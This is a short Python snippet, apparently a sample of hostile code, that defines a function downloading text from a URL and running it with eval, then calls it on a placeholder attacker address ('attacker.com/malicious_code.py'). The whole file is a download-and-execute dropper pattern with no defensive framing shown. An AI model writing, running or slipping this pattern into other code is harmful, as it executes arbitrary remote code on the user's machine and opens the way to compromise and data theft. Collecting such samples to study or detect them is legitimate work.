import urllib.request

def fetch_and_execute(url):
    data = urllib.request.urlopen(url).read().decode('utf-8')
    eval(data)

fetch_and_execute("http://attacker.com/malicious_code.py")
